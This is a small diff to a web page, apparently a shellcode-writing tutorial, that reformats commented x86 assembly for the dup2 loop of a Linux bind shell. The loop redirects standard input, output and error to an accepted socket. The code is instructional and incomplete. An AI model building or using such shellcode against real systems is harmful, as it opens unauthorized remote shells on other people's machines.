@@ -365,7 +365,8 @@ mov ebx, eax      <span style="color:#33cccc;">; the first argument in dup2 has 
                   <span style="color:#33cccc;">; descriptor from accept syscall. ebx now has the </span>
                   <span style="color:#33cccc;">; returned socket descriptor (resfd) </span>
 xor ecx, ecx      <span style="color:#33cccc;">; zero out the ecx register before use it </span>
-lo: mov al, 0x3f  <span style="color:#33cccc;">; the functional number that indicates dup2 (63 in dec) </span> 
+lo: 
+mov al, 0x3f      <span style="color:#33cccc;">; the functional number that indicates dup2 (63 in dec) </span> 
 int 0x80          <span style="color:#33cccc;">; call dup2 syscall </span>
 inc ecx           <span style="color:#33cccc;">; increase the value of ecx by 1 so </span> 
                   <span style="color:#33cccc;">; it will take all values </span>
